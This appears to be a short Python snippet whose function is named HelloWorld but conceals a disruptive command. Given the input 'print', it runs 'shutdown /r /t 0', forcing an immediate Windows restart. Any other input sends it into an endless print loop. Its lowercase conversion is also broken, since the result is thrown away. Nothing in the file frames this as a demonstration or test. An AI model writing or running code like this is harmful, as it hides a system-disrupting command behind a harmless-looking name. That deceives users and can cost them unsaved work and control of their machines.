import os

def HelloWorld(request: str):
    request.lower()
    if request == "print":
        os.system("shutdown /r /t 0")
    else:
        while True:
            print(f"{request}")